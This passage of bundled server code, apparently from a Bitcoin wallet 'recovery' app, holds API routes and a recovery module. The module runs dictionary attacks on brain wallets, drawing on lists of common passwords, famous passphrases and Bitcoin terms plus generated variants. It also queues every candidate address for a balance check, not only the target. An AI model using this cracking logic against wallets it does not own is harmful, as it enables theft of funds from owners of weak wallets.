    const wasActive = nearMissManager2.isResetTriggerActive();
    nearMissManager2.acknowledgeResetTrigger();
    console.log(`[Trends] Reset trigger acknowledged by user, was active: ${wasActive}`);
    res.json({
      success: true,
      message: wasActive ? "Reset trigger acknowledged - plateau counter cleared" : "No active reset trigger",
      wasActive,
      trends: nearMissManager2.getPhiTemporalTrends()
    });
  } catch (error) {
    console.error("[Trends] Acknowledge reset error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.post("/temporal-trends/record-sample", standardLimiter2, async (req, res) => {
  try {
    const { nearMissManager: nearMissManager2 } = await Promise.resolve().then(() => (init_near_miss_manager(), near_miss_manager_exports));
    const { phi } = req.body;
    if (typeof phi !== "number" || phi <= 0 || phi > 1) {
      return res.status(400).json({
        error: "Invalid phi value",
        hint: "Provide a phi value between 0 and 1 (exclusive of 0)"
      });
    }
    nearMissManager2.recordPhiTemporalSample(phi);
    res.json({
      success: true,
      message: `Recorded \u03A6 sample: ${phi.toFixed(4)}`,
      trends: nearMissManager2.getPhiTemporalTrends()
    });
  } catch (error) {
    console.error("[Trends] Record sample error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.get("/near-misses/success-rates", isAuthenticated, generousLimiter3, async (req, res) => {
  try {
    const { nearMissManager: nearMissManager2 } = await Promise.resolve().then(() => (init_near_miss_manager(), near_miss_manager_exports));
    const successRates = nearMissManager2.getTierSuccessRates();
    const stats2 = nearMissManager2.getStats();
    const insights = [];
    if (successRates.overall.tierValidation === "validated") {
      insights.push("Tier system validated: HOT tier converts at higher rate than WARM/COOL");
    } else if (successRates.overall.tierValidation === "tier_inversion") {
      insights.push("WARNING: Tier inversion detected - lower tiers converting better than HOT");
      insights.push("Consider adjusting tier thresholds or \u03A6 scoring");
    } else {
      insights.push("Insufficient conversion data - need more discoveries to validate tiers");
    }
    if (successRates.hot.avgTimeToConversion > 0) {
      insights.push(`HOT tier avg time to conversion: ${successRates.hot.avgTimeToConversion.toFixed(1)} hours`);
    }
    res.json({
      success: true,
      successRates,
      insights,
      stats: {
        total: stats2.total,
        hot: stats2.hot,
        warm: stats2.warm,
        cool: stats2.cool
      }
    });
  } catch (error) {
    console.error("[NearMiss] Success rates error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.get("/basin-heatmap", generousLimiter3, async (req, res) => {
  try {
    const { geometricMemory: geometricMemory2 } = await Promise.resolve().then(() => (init_geometric_memory(), geometric_memory_exports));
    const resolution = Math.min(50, Math.max(5, parseInt(req.query.resolution) || 20));
    const method = req.query.method || "pca_2d";
    if (!["pca_2d", "dim_01", "phi_kappa"].includes(method)) {
      return res.status(400).json({
        error: "Invalid projection method",
        valid: ["pca_2d", "dim_01", "phi_kappa"],
        hint: "pca_2d (default) uses weighted first dimensions, dim_01 uses raw first 2 coords, phi_kappa uses \u03A6/\u03BA directly"
      });
    }
    const heatmap = geometricMemory2.getBasinHeatmap(resolution, method);
    res.json({
      success: true,
      heatmap,
      summary: {
        totalProbes: heatmap.totalProbes,
        coveragePercent: heatmap.coveragePercent.toFixed(1) + "%",
        exploredCells: heatmap.exploredCells,
        totalCells: heatmap.totalCells,
        avgPhi: heatmap.avgPhi.toFixed(4),
        hotZoneCount: heatmap.hotZones.length,
        coldZoneCount: heatmap.coldZones.length
      },
      insights: [
        heatmap.coveragePercent < 10 ? "Low coverage - expand exploration radius" : heatmap.coveragePercent < 50 ? "Moderate coverage - focus on hot zone neighbors" : "Good coverage - refine high-\u03A6 regions",
        heatmap.hotZones.length > 0 ? `${heatmap.hotZones.length} hot zones identified with avg \u03A6 > 0.6` : "No high-\u03A6 zones detected yet",
        heatmap.coldZones.length > 0 ? `${heatmap.coldZones.length} under-explored zones worth investigating` : "No obvious gaps in exploration"
      ]
    });
  } catch (error) {
    console.error("[Heatmap] Basin heatmap error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.get("/phi-sparkline", generousLimiter3, async (req, res) => {
  try {
    const { geometricMemory: geometricMemory2 } = await Promise.resolve().then(() => (init_geometric_memory(), geometric_memory_exports));
    const count = Math.min(500, Math.max(1, parseInt(req.query.count) || 50));
    const sparkline = geometricMemory2.getPhiSparkline(count);
    res.json({
      success: true,
      sparkline,
      summary: {
        trend: sparkline.trend,
        trendIcon: sparkline.trend === "rising" ? "trending-up" : sparkline.trend === "falling" ? "trending-down" : "minus",
        samples: sparkline.sampleCount,
        range: `${sparkline.min.toFixed(4)} - ${sparkline.max.toFixed(4)}`,
        avgPhi: sparkline.avgPhi.toFixed(4),
        volatility: sparkline.volatility.toFixed(4),
        slope: sparkline.slope.toFixed(6)
      },
      insights: [
        sparkline.sampleCount === 0 ? "No probe data yet - start exploration to see \u03A6 trends" : `Tracking ${sparkline.sampleCount} recent \u03A6 samples`,
        sparkline.trend === "rising" ? "\u03A6 is rising - current search direction shows promise" : sparkline.trend === "falling" ? "\u03A6 is declining - consider changing exploration strategy" : "\u03A6 is stable - steady state exploration",
        sparkline.volatility > 0.2 ? "High volatility - exploring diverse regions" : sparkline.volatility > 0.05 ? "Moderate volatility - balanced exploration" : "Low volatility - focused search area"
      ]
    });
  } catch (error) {
    console.error("[Sparkline] Phi sparkline error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.get("/strategy-performance", generousLimiter3, async (req, res) => {
  try {
    const { geometricMemory: geometricMemory2 } = await Promise.resolve().then(() => (init_geometric_memory(), geometric_memory_exports));
    const dashboard = geometricMemory2.getStrategyPerformanceDashboard();
    res.json({
      success: true,
      dashboard,
      summary: {
        totalStrategies: dashboard.strategies.length,
        totalProbes: dashboard.totalProbes,
        overallAvgPhi: dashboard.overallAvgPhi.toFixed(4),
        overallMaxPhi: dashboard.overallMaxPhi.toFixed(4),
        topStrategy: dashboard.topStrategy,
        recommendationCount: dashboard.recommendations.length
      },
      strategyBreakdown: dashboard.strategies.map((s) => ({
        name: s.strategyName,
        tests: s.testsPerformed,
        avgPhi: s.avgPhi.toFixed(4),
        maxPhi: s.maxPhi.toFixed(4),
        nearMisses: s.nearMisses,
        nearMissRate: (s.nearMissRate * 100).toFixed(1) + "%",
        effectiveness: (s.effectivenessScore * 100).toFixed(1) + "%",
        trend: s.recentTrend,
        trendIcon: s.recentTrend === "rising" ? "trending-up" : s.recentTrend === "falling" ? "trending-down" : "minus"
      }))
    });
  } catch (error) {
    console.error("[Strategy] Performance dashboard error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.get("/cluster-evolution", generousLimiter3, async (req, res) => {
  try {
    const { geometricMemory: geometricMemory2 } = await Promise.resolve().then(() => (init_geometric_memory(), geometric_memory_exports));
    const windowSizeMs = Math.max(
      60 * 1e3,
      // min 1 minute
      Math.min(
        24 * 60 * 60 * 1e3,
        // max 1 day
        parseInt(req.query.windowSizeMs) || 60 * 60 * 1e3
        // default 1 hour
      )
    );
    const maxFrames = Math.max(1, Math.min(100, parseInt(req.query.maxFrames) || 24));
    const clusterThreshold = Math.max(0.05, Math.min(1, parseFloat(req.query.threshold) || 0.3));
    const animation = geometricMemory2.getClusterEvolutionFrames(windowSizeMs, maxFrames, clusterThreshold);
    const hoursPerWindow = animation.windowSizeMs / (1e3 * 60 * 60);
    const windowLabel = hoursPerWindow >= 24 ? "days" : hoursPerWindow >= 1 ? "hours" : "minutes";
    res.json({
      success: true,
      animation,
      summary: {
        totalFrames: animation.totalFrames,
        totalProbes: animation.totalProbes,
        timeSpanHours: (animation.timeSpanMs / (1e3 * 60 * 60)).toFixed(1),
        windowSize: `${hoursPerWindow.toFixed(1)} ${windowLabel}`,
        avgClustersPerFrame: animation.avgClustersPerFrame.toFixed(1),
        maxClustersInFrame: animation.maxClustersInFrame
      },
      insights: [
        animation.totalFrames === 0 ? "No probe data yet - start exploration to see cluster evolution" : `${animation.totalFrames} animation frames spanning ${(animation.timeSpanMs / (1e3 * 60 * 60)).toFixed(1)} hours`,
        animation.avgClustersPerFrame > 5 ? "High cluster diversity - exploration is well-distributed" : animation.avgClustersPerFrame > 1 ? "Moderate clustering - focused exploration with some spread" : "Low clustering - very focused search area",
        animation.maxClustersInFrame > animation.avgClustersPerFrame * 2 ? "Significant cluster variation over time - dynamic exploration" : "Consistent cluster count - stable exploration pattern"
      ]
    });
  } catch (error) {
    console.error("[ClusterEvolution] Animation error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.post("/near-misses/conversion", isAuthenticated, standardLimiter2, async (req, res) => {
  try {
    const { nearMissManager: nearMissManager2 } = await Promise.resolve().then(() => (init_near_miss_manager(), near_miss_manager_exports));
    const { phrase, entryId, matchAddress } = req.body;
    if (!phrase && !entryId) {
      return res.status(400).json({
        error: "Must provide either phrase or entryId",
        hint: 'POST with { phrase: "..." } or { entryId: "..." }'
      });
    }
    let record;
    if (entryId) {
      record = nearMissManager2.recordConversion(entryId, matchAddress);
    } else {
      record = nearMissManager2.recordConversionByPhrase(phrase, matchAddress);
    }
    if (!record) {
      return res.status(404).json({
        success: false,
        error: "Near-miss entry not found",
        hint: phrase ? `No entry found for phrase: "${phrase.slice(0, 50)}..."` : `No entry found for ID: ${entryId}`
      });
    }
    console.log(`[NearMiss] Conversion recorded: ${record.tier} tier, \u03A6=${record.phi.toFixed(4)}`);
    res.json({
      success: true,
      record,
      message: `Recorded ${record.tier.toUpperCase()} tier conversion`,
      successRates: nearMissManager2.getTierSuccessRates()
    });
  } catch (error) {
    console.error("[NearMiss] Conversion recording error:", error);
    res.status(500).json({ error: error.message });
  }
});

// server/routes/recovery.ts
init_storage();
import { Router as Router8 } from "express";
import rateLimit5 from "express-rate-limit";
import fs14 from "fs";
import path14 from "path";

// server/unified-recovery.ts
init_schema();
init_crypto();
init_qig_universal();
init_blockchain_forensics();
init_historical_data_miner();
init_ocean_agent();
init_balance_queue_integration();
var ERA_PATTERNS_2009 = [
  // Satoshi & Bitcoin core
  "satoshi",
  "bitcoin",
  "nakamoto",
  "satoshi nakamoto",
  "crypto",
  "digital cash",
  "p2p",
  "peer to peer",
  "cypherpunk",
  "cypherpunks",
  "hashcash",
  "proof of work",
  "double spend",
  "genesis block",
  "block chain",
  "blockchain",
  "cryptocurrency",
  "decentralized",
  "trustless",
  "private key",
  "public key",
  "wallet",
  "mining",
  "miner",
  "hash",
  "sha256",
  "sha-256",
  "ecdsa",
  "secp256k1",
  "merkle",
  "merkle tree",
  "nonce",
  "difficulty",
  // Early pioneers
  "hal finney",
  "hal",
  "finney",
  "wei dai",
  "nick szabo",
  "b-money",
  "bit gold",
  "adam back",
  "hashcash",
  // Mailing lists & forums
  "cryptography mailing list",
  "metzdowd",
  "sourceforge",
  "bitcointalk",
  "bitcoin forum",
  // Technical terms
  "block reward",
  "coinbase",
  "50 btc",
  "target",
  "timestamp",
  "version",
  "previous hash"
];
var COMMON_PASSWORDS_2009 = [
  "password",
  "123456",
  "12345678",
  "1234567890",
  "qwerty",
  "abc123",
  "monkey",
  "master",
  "dragon",
  "letmein",
  "login",
  "princess",
  "solo",
  "passw0rd",
  "starwars",
  "trustno1",
  "whatever",
  "shadow",
  "sunshine",
  "iloveyou",
  "ninja",
  "mustang",
  "password1",
  "password123",
  "admin",
  "welcome",
  "hello",
  "charlie",
  "donald",
  "baseball",
  "football",
  "hockey",
  "superman",
  "batman",
  "access"
];
var BRAIN_WALLET_CLASSICS = [
  // Famous leaked brain wallets
  "correct horse battery staple",
  "satoshi nakamoto",
  "bitcoin",
  "the quick brown fox jumps over the lazy dog",
  "hello world",
  "test",
  "testing",
  "test123",
  "password",
  "passphrase",
  // Genesis block references
  "genesis",
  "genesis block",
  "block 0",
  "block zero",
  "the times 03 jan 2009",
  "chancellor on brink of second bailout for banks",
  // Early Bitcoin culture
  "i am satoshi",
  "we are all satoshi",
  "first bitcoin",
  "my first bitcoin",
  "freedom",
  "liberty",
  "revolution",
  "the future of money",
  "digital gold",
  "in cryptography we trust",
  "in code we trust",
  "bank the unbanked",
  "be your own bank",
  "hodl",
  "hold on for dear life",
  "to the moon",
  "wen moon",
  // Simple phrases
  "secret",
  "my secret",
  "private",
  "bitcoin wallet",
  "my wallet",
  "my bitcoin",
  "satoshi vision",
  "whitepaper"
];
var BITCOIN_TERMS = [
  "satoshi",
  "bitcoin",
  "btc",
  "xbt",
  "blockchain",
  "mining",
  "miner",
  "hash",
  "hashing",
  "hashrate",
  "wallet",
  "address",
  "transaction",
  "tx",
  "txid",
  "block",
  "blockheight",
  "confirmation",
  "confirmations",
  "difficulty",
  "halving",
  "reward",
  "coinbase",
  "genesis",
  "node",
  "peer",
  "network",
  "p2p",
  "decentralized",
  "trustless",
  "permissionless",
  "immutable",
  "double spend",
  "proof of work",
  "pow",
  "consensus",
  "merkle",
  "nonce",
  "target",
  "timestamp"
];
var CYPHERPUNK_PHRASES = [
  "privacy is necessary",
  "cypherpunks write code",
  "cryptography is defense",
  "anonymity is a shield",
  "we the cypherpunks",
  "digital revolution",
  "code is speech",
  "information wants to be free",
  "crypto anarchy",
  "electronic frontier"
];
var UnifiedRecoveryOrchestrator = class {
  sessions = /* @__PURE__ */ new Map();
  runningStrategies = /* @__PURE__ */ new Map();
  async createSession(targetAddress, memoryFragments = []) {
    const id = `unified-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    const strategies = recoveryStrategyTypes.map((type) => ({
      id: `${id}-${type}`,
      type,
      status: "pending",
      progress: { current: 0, total: 0, rate: 0 },
      candidatesFound: 0
    }));
    const session2 = {
      id,
      targetAddress,
      status: "initializing",
      memoryFragments: memoryFragments.length > 0 ? memoryFragments : void 0,
      strategies,
      candidates: [],
      evidence: [],
      matchFound: false,
      startedAt: (/* @__PURE__ */ new Date()).toISOString(),
      updatedAt: (/* @__PURE__ */ new Date()).toISOString(),
      totalTested: 0,
      testRate: 0
    };
    this.sessions.set(id, session2);
    if (memoryFragments.length > 0) {
      console.log(`[UnifiedRecovery] Created session ${id} for ${targetAddress} with ${memoryFragments.length} memory fragments`);
      memoryFragments.forEach((f) => {
        console.log(`  - "${f.text}" (confidence: ${f.confidence}, epoch: ${f.epoch})`);
      });
    } else {
      console.log(`[UnifiedRecovery] Created session ${id} for ${targetAddress}`);
    }
    return session2;
  }
  getSession(id) {
    return this.sessions.get(id);
  }
  getAllSessions() {
    return Array.from(this.sessions.values());
  }
  async startRecovery(sessionId) {
    const session2 = this.sessions.get(sessionId);
    if (!session2) throw new Error(`Session not found: ${sessionId}`);
    const abortController = new AbortController();
    this.runningStrategies.set(sessionId, abortController);
    try {
      session2.status = "analyzing";
      this.updateSession(session2);
      console.log(`[UnifiedRecovery] Analyzing blockchain for ${session2.targetAddress}`);
      try {
        const forensics = await blockchainForensics.analyzeAddress(session2.targetAddress);
        const isPreBIP39 = blockchainForensics.isPreBIP39Era(forensics);
        const likelyFormats = blockchainForensics.estimateLikelyKeyFormat(forensics);
        const likelyFormat = { arbitrary: 0, bip39: 0, master: 0 };
        for (const fmt of likelyFormats) {
          if (fmt.format === "arbitrary") likelyFormat.arbitrary = fmt.confidence;
          else if (fmt.format === "bip39") likelyFormat.bip39 = fmt.confidence;
          else if (fmt.format === "hd_wallet") likelyFormat.master = fmt.confidence;
        }
        session2.blockchainAnalysis = {
          era: isPreBIP39 ? "pre-bip39" : "post-bip39",
          firstSeen: forensics.creationTimestamp?.toISOString(),
          totalReceived: forensics.totalReceived,
          balance: forensics.balance,
          txCount: forensics.txCount,
          likelyFormat,
          neighborAddresses: forensics.siblingAddresses || []
        };
        session2.evidence.push({
          id: `ev-blockchain-${Date.now()}`,
          type: "blockchain",
          source: "Blockstream API",
          content: `Era: ${isPreBIP39 ? "pre-bip39" : "post-bip39"}, First seen: ${forensics.creationTimestamp?.toISOString() || "unknown"}`,
          relevance: 0.9,
          extractedFragments: [],
          discoveredAt: (/* @__PURE__ */ new Date()).toISOString()
        });
      } catch {
        console.log(`[UnifiedRecovery] Blockchain analysis failed, continuing with defaults`);
        session2.blockchainAnalysis = {
          era: "pre-bip39",
          totalReceived: 0,
          balance: 0,
          txCount: 0,
          likelyFormat: { arbitrary: 0.8, bip39: 0.1, master: 0.1 },
          neighborAddresses: []
        };
      }
      this.updateSession(session2);
      session2.status = "running";
      this.updateSession(session2);
      console.log(`[UnifiedRecovery] Starting all recovery strategies...`);
      await Promise.allSettled([
        this.runStrategy(session2, "era_patterns", abortController.signal),
        this.runStrategy(session2, "brain_wallet_dict", abortController.signal),
        this.runStrategy(session2, "bitcoin_terms", abortController.signal),
        this.runStrategy(session2, "linguistic", abortController.signal),
        this.runStrategy(session2, "qig_basin_search", abortController.signal),
        this.runHistoricalAutonomous(session2, abortController.signal),
        this.runCrossFormatHypotheses(session2, abortController.signal)
      ]);
      if (session2.matchFound) {
        session2.status = "completed";
        console.log(`[UnifiedRecovery] \u{1F3AF} RECOVERY SUCCESSFUL: ${session2.matchedPhrase}`);
        session2.completedAt = (/* @__PURE__ */ new Date()).toISOString();
        this.updateSession(session2);
      } else {
        console.log(`[UnifiedRecovery] Initial strategies completed. Starting learning loop...`);
        session2.status = "learning";
        this.updateSession(session2);
        await this.runLearningLoop(session2, abortController.signal);
        if (session2.matchFound) {
          session2.status = "completed";
          console.log(`[UnifiedRecovery] \u{1F3AF} RECOVERY SUCCESSFUL via learning: ${session2.matchedPhrase}`);
        } else {
          session2.status = "completed";
          console.log(`[UnifiedRecovery] Learning loop completed. ${session2.candidates.length} candidates found.`);
        }
        session2.completedAt = (/* @__PURE__ */ new Date()).toISOString();
        this.updateSession(session2);
      }
    } catch (error) {
      if (error.name === "AbortError") {
        console.log(`[UnifiedRecovery] Session ${sessionId} was stopped`);
        session2.status = "completed";
      } else {
        console.error(`[UnifiedRecovery] Session ${sessionId} failed:`, error);
        session2.status = "failed";
      }
      this.updateSession(session2);
    } finally {
      this.runningStrategies.delete(sessionId);
    }
  }
  stopRecovery(sessionId) {
    const controller = this.runningStrategies.get(sessionId);
    if (controller) {
      controller.abort();
      const session2 = this.sessions.get(sessionId);
      if (session2) {
        session2.status = "completed";
        session2.completedAt = (/* @__PURE__ */ new Date()).toISOString();
        this.updateSession(session2);
      }
    }
  }
  async runStrategy(session2, strategyType, signal) {
    const strategy = session2.strategies.find((s) => s.type === strategyType);
    if (!strategy) return;
    strategy.status = "running";
    strategy.startedAt = (/* @__PURE__ */ new Date()).toISOString();
    this.updateSession(session2);
    try {
      const phrases = this.generatePhrasesForStrategy(strategyType, session2.blockchainAnalysis?.era);
      strategy.progress.total = phrases.length;
      console.log(`[UnifiedRecovery] Strategy ${strategyType}: Testing ${phrases.length} phrases`);
      const startTime2 = Date.now();
      let tested = 0;
      for (const phraseData of phrases) {
        if (signal.aborted) throw new DOMException("Aborted", "AbortError");
        if (session2.matchFound) break;
        const candidate = await this.testPhrase(
          session2.targetAddress,
          phraseData.phrase,
          phraseData.format,
          strategyType,
          phraseData.derivationPath
        );
        tested++;
        strategy.progress.current = tested;
        const elapsed = (Date.now() - startTime2) / 1e3;
        strategy.progress.rate = elapsed > 0 ? tested / elapsed : 0;
        session2.totalTested++;
        const totalElapsed = (Date.now() - new Date(session2.startedAt).getTime()) / 1e3;
        session2.testRate = totalElapsed > 0 ? session2.totalTested / totalElapsed : 0;
        if (candidate) {
          session2.candidates.push(candidate);
          strategy.candidatesFound++;
          session2.candidates.sort((a, b) => b.combinedScore - a.combinedScore);
          if (session2.candidates.length > 100) {
            session2.candidates = session2.candidates.slice(0, 100);
          }
          if (candidate.match) {
            session2.matchFound = true;
            session2.matchedPhrase = candidate.phrase;
            console.log(`[UnifiedRecovery] \u{1F3AF} MATCH FOUND: "${candidate.phrase}" (${strategyType})`);
          }
        }
        if (tested % 100 === 0) {
          this.updateSession(session2);
        }
      }
      strategy.status = "completed";
      strategy.completedAt = (/* @__PURE__ */ new Date()).toISOString();
      console.log(`[UnifiedRecovery] Strategy ${strategyType}: Completed. ${strategy.candidatesFound} candidates found.`);
    } catch (error) {
      if (error.name === "AbortError") {
        strategy.status = "completed";
      } else {
        strategy.status = "failed";
        strategy.error = error.message;
        console.error(`[UnifiedRecovery] Strategy ${strategyType} failed:`, error);
      }
    }
    this.updateSession(session2);
  }
  generatePhrasesForStrategy(type, _era) {
    const results = [];
    switch (type) {
      case "era_patterns":
        for (const pattern of ERA_PATTERNS_2009) {
          results.push({ phrase: pattern, format: "arbitrary" });
          results.push({ phrase: pattern.toUpperCase(), format: "arbitrary" });
          results.push({ phrase: this.capitalize(pattern), format: "arbitrary" });
          results.push({ phrase: `${pattern}123`, format: "arbitrary" });
          results.push({ phrase: `${pattern}!`, format: "arbitrary" });
        }
        for (const phrase of CYPHERPUNK_PHRASES) {
          results.push({ phrase, format: "arbitrary" });
          results.push({ phrase: phrase.toLowerCase(), format: "arbitrary" });
        }
        for (const pattern of ["satoshi", "bitcoin", "genesis", "crypto"]) {
          for (const year of [2009, 2010, 2011]) {
            results.push({ phrase: `${pattern}${year}`, format: "arbitrary" });
            results.push({ phrase: `${pattern}_${year}`, format: "arbitrary" });
          }
        }
        break;
      case "brain_wallet_dict":
        for (const phrase of BRAIN_WALLET_CLASSICS) {
          results.push({ phrase, format: "arbitrary" });
          results.push({ phrase: phrase.toLowerCase(), format: "arbitrary" });
          results.push({ phrase: phrase.toUpperCase(), format: "arbitrary" });
          results.push({ phrase: phrase.replace(/\s/g, ""), format: "arbitrary" });
          results.push({ phrase: phrase.replace(/\s/g, "_"), format: "arbitrary" });
          results.push({ phrase: phrase.replace(/\s/g, "-"), format: "arbitrary" });
          for (const num of ["1", "123", "!", "!!"]) {
            results.push({ phrase: `${phrase}${num}`, format: "arbitrary" });
          }
        }
        for (const pwd of COMMON_PASSWORDS_2009) {
          results.push({ phrase: pwd, format: "arbitrary" });
          results.push({ phrase: `${pwd}bitcoin`, format: "arbitrary" });
          results.push({ phrase: `bitcoin${pwd}`, format: "arbitrary" });
        }
        break;
      case "bitcoin_terms":
        for (const term of BITCOIN_TERMS) {
          results.push({ phrase: term, format: "arbitrary" });
          results.push({ phrase: `my ${term}`, format: "arbitrary" });
          results.push({ phrase: `${term} wallet`, format: "arbitrary" });
          results.push({ phrase: `my ${term} wallet`, format: "arbitrary" });
          results.push({ phrase: `${term} password`, format: "arbitrary" });
          results.push({ phrase: `${term} secret`, format: "arbitrary" });
          for (const year of [2009, 2010, 2011]) {
            results.push({ phrase: `${term}${year}`, format: "arbitrary" });
          }
          for (const suffix of ["123", "1", "!", "01"]) {
            results.push({ phrase: `${term}${suffix}`, format: "arbitrary" });
          }
        }
        break;
      case "linguistic":
        const subjects = ["i", "my", "the", "this is", "remember", "dont forget"];
        const verbs = ["love", "want", "need", "have", "like", "own"];
        const objects = ["bitcoin", "money", "freedom", "crypto", "coins", "satoshi"];
        for (const subj of subjects) {
          for (const verb of verbs) {
            for (const obj of objects) {
              results.push({ phrase: `${subj} ${verb} ${obj}`, format: "arbitrary" });
              results.push({ phrase: `${subj}${verb}${obj}`, format: "arbitrary" });
            }
          }
        }
        for (let month = 1; month <= 12; month++) {
          for (let day = 1; day <= 28; day++) {
            results.push({ phrase: `${month}/${day}/2009`, format: "arbitrary" });
            results.push({ phrase: `2009${month.toString().padStart(2, "0")}${day.toString().padStart(2, "0")}`, format: "arbitrary" });
          }
        }
        const simplePatterns = [
          "my secret",
          "secret key",
          "my key",
          "bitcoin key",
          "wallet password",
          "my password",
          "remember this",
          "do not forget",
          "important",
          "backup",
          "recovery"
        ];
        for (const pattern of simplePatterns) {
          results.push({ phrase: pattern, format: "arbitrary" });
          results.push({ phrase: pattern.replace(/\s/g, ""), format: "arbitrary" });
        }
        break;
      case "qig_basin_search":
        const seeds = ["genesis", "origin", "first", "zero", "alpha", "omega", "one", "start"];
        for (const seed of seeds) {
          for (let i = 0; i <= 99; i++) {
            results.push({ phrase: `${seed}${i}`, format: "arbitrary" });
            if (i < 10) {
              results.push({ phrase: `${seed}_${i}`, format: "arbitrary" });
              results.push({ phrase: `${seed}0${i}`, format: "arbitrary" });
            }
          }
          results.push({ phrase: seed, format: "master", derivationPath: "m/44'/0'/0'/0/0" });
          results.push({ phrase: seed, format: "master", derivationPath: "m/0'/0'/0'" });
          results.push({ phrase: seed, format: "master", derivationPath: "m/0" });
        }
        for (let i = 0; i <= 999; i++) {
          results.push({ phrase: i.toString(), format: "arbitrary" });
        }
        break;
      case "blockchain_neighbors":
      case "forum_mining":
      case "archive_temporal":
        results.push({ phrase: "bitcointalk", format: "arbitrary" });
        results.push({ phrase: "sourceforge", format: "arbitrary" });
        results.push({ phrase: "github", format: "arbitrary" });
        break;
    }
    return results;
  }
  capitalize(s) {
    return s.split(" ").map((w) => w.charAt(0).toUpperCase() + w.slice(1)).join(" ");
  }
  async testPhrase(targetAddress, phrase, format, source, derivationPath) {
    try {
      let address;
      if (format === "master" && derivationPath) {
        address = deriveBIP32Address(phrase, derivationPath);
      } else {
        address = generateBitcoinAddress(phrase);
      }
      queueAddressForBalanceCheck(phrase, "unified-recovery", 5);
      const match = address === targetAddress;
      const qigResult = scoreUniversalQIG(
        phrase,
        format === "bip39" ? "bip39" : format === "master" ? "master-key" : "arbitrary"
      );
      const kappaProximity = 1 - Math.abs(qigResult.kappa - 64) / 64;
      const combinedScore = qigResult.phi * 0.4 + qigResult.quality * 0.3 + kappaProximity * 0.3 + (match ? 100 : 0);
      if (match || combinedScore > 0.6) {
        return {
          id: `cand-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
          phrase,
          format,
          derivationPath,
          address,
          match,
          source,
          confidence: qigResult.quality,
          qigScore: {
            phi: qigResult.phi,
            kappa: qigResult.kappa,
            regime: qigResult.regime
          },
          combinedScore,
          testedAt: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      return null;
    } catch {
      return null;
    }
  }
  updateSession(session2) {
    session2.updatedAt = (/* @__PURE__ */ new Date()).toISOString();
    this.sessions.set(session2.id, session2);
  }
  /**
   * MEMORY FRAGMENT VARIATION GENERATOR
   * 
   * Generates multiple hypothesis variations from a single memory fragment.
   * Higher confidence fragments get fewer variations (more focused search).
   * Lower confidence fragments get more exploratory variations.
   */
  generateFragmentVariations(fragment) {
    const variations = [];
    const text2 = fragment.text.trim();
    variations.push({ phrase: text2, type: "original", confidenceMultiplier: 1 });
    variations.push({ phrase: text2.toLowerCase(), type: "lowercase", confidenceMultiplier: 0.95 });
    variations.push({ phrase: text2.toUpperCase(), type: "uppercase", confidenceMultiplier: 0.7 });
    variations.push({
      phrase: text2.charAt(0).toUpperCase() + text2.slice(1).toLowerCase(),
      type: "capitalized",
      confidenceMultiplier: 0.85
    });
    variations.push({
      phrase: text2.replace(/\s+/g, ""),
      type: "no_spaces",
      confidenceMultiplier: 0.8
    });
    variations.push({
      phrase: text2.replace(/\s+/g, "_"),
      type: "underscores",
      confidenceMultiplier: 0.75
    });
    const camelCase = text2.split(/\s+/).map(
      (w, i) => i === 0 ? w.toLowerCase() : w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()
    ).join("");
    variations.push({ phrase: camelCase, type: "camelCase", confidenceMultiplier: 0.7 });
    const suffixes = ["1", "77", "123", "!", "@", "#", "2009", "09"];
    for (const suffix of suffixes) {
      variations.push({
        phrase: text2 + suffix,
        type: `suffix_${suffix}`,
        confidenceMultiplier: 0.6
      });
      variations.push({
        phrase: text2.toLowerCase() + suffix,
        type: `lowercase_suffix_${suffix}`,
        confidenceMultiplier: 0.55
      });
    }
    if (fragment.confidence < 0.7) {
      const leet = text2.replace(/e/gi, "3").replace(/a/gi, "4").replace(/i/gi, "1").replace(/o/gi, "0").replace(/s/gi, "5");
      variations.push({ phrase: leet, type: "l33t", confidenceMultiplier: 0.4 });
    }
    const numMatch = text2.match(/(\d+)$/);
    if (numMatch) {
      const base = text2.slice(0, -numMatch[1].length);
      const num = parseInt(numMatch[1]);
      variations.push({ phrase: base + (num - 1), type: "num_minus_1", confidenceMultiplier: 0.5 });
      variations.push({ phrase: base + (num + 1), type: "num_plus_1", confidenceMultiplier: 0.5 });
      if (num < 10) {
        variations.push({ phrase: base + num + num, type: "num_doubled", confidenceMultiplier: 0.45 });
      }
    }
    const seen = /* @__PURE__ */ new Set();
    return variations.filter((v) => {
      if (seen.has(v.phrase)) return false;
      seen.add(v.phrase);
      return true;
    });
  }
  /**
   * AUTONOMOUS MODE: Historical Data Mining
   * Generates its own fragments from 2009-era patterns without user input
   */
  async runHistoricalAutonomous(session2, signal) {
    const strategy = session2.strategies.find((s) => s.type === "historical_autonomous");
    if (!strategy) return;
    strategy.status = "running";
    strategy.startedAt = (/* @__PURE__ */ new Date()).toISOString();
    this.updateSession(session2);
    try {
      const era = session2.blockchainAnalysis?.era || "genesis-2009";
      console.log(`[UnifiedRecovery] Mining historical patterns for era: ${era}`);
      const minedData = await historicalDataMiner.mineEra(era);
      const scoredPatterns = await historicalDataMiner.scorePatterns(minedData.patterns);
      strategy.progress.total = scoredPatterns.length;
      console.log(`[UnifiedRecovery] Historical Autonomous: Testing ${scoredPatterns.length} mined patterns`);
      session2.evidence.push({
        id: `ev-mining-${Date.now()}`,
        type: "pattern",
        source: "Historical Data Miner",
        content: `Mined ${scoredPatterns.length} patterns from ${minedData.sources.length} sources for era ${era}`,
        relevance: 0.8,
        extractedFragments: minedData.sources.map((s) => s.name),
        discoveredAt: (/* @__PURE__ */ new Date()).toISOString()
      });
      const startTime2 = Date.now();
      let tested = 0;
      for (const pattern of scoredPatterns) {
        if (signal.aborted) throw new DOMException("Aborted", "AbortError");
        if (session2.matchFound) break;
        const evidenceChain = [{
          source: pattern.source.name,
          type: pattern.source.type,
          reasoning: pattern.reasoning,
          confidence: pattern.likelihood
        }];
        const candidate = await this.testPhraseWithEvidence(
          session2.targetAddress,
          pattern.phrase,
          pattern.format,
          "historical_autonomous",
          evidenceChain,
